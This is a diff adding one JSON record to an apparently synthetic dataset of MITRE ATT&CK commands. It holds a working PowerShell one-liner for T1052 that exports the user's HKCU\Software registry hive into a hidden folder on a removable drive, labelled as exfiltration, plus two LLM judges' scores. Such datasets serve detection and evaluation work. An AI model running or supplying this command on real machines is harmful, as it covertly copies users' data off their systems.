@@ -1,0 +1,48 @@
+{
+  "technique_id": "T1052",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "$dl=(Get-Volume -DriveType Removable | Select -First 1 -Expand DriveLetter); $dest=\"$dl`:\\$env:USERNAME.data\"; New-Item -ItemType Directory -Force -Path $dest | Out-Null; attrib +h $dest; reg.exe export HKCU\\Software \"$dest\\hkcu.reg\" /y > \"$dest\\reg.log\"; Write-Output \"Exported HKCU to $dest at $(Get-Date)\" | Out-File \"$dest\\op.log\" -Append",
+  "explanation": "Exports the current user registry hive to a removable drive, useful for offline analysis or exfiltration via physical media.",
+  "rationale_steps": [
+    "Identify removable drive and create hidden destination",
+    "Export HKCU\\Software registry hive to a file on USB",
+    "Write an operation log using Write-Output",
+    "Keep all actions local without network usage"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1052-a3760856-782ac129",
+  "source_prompt_hash": "a3760856",
+  "timestamp_utc": "2025-09-30T05:14:51.683873Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with proper PowerShell syntax, balanced quotes/parentheses/braces, appropriate variable assignments, pipeline operations, and error redirection.",
+        "semantic_score": 5,
+        "semantic_justification": "The command fully implements the T1052 technique by automatically detecting a removable drive, creating a hidden directory, exporting registry data to it, and logging the operation - all core components of exfiltration over physical medium.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-01T09:29:47.508744Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed, with correct PowerShell syntax, balanced elements, valid flags, and proper command separators, despite a minor stylistic choice with the backtick.",
+        "semantic_score": 5,
+        "semantic_justification": "The command flawlessly executes the claimed intent of exporting user registry data to a removable drive for exfiltration, directly aligning with the T1052 technique by identifying a physical medium, staging data, and attempting to hide it without requiring elevated privileges.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2025-10-01T09:30:03.681955Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 5.0,
+    "llm_average_score": 5.0,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
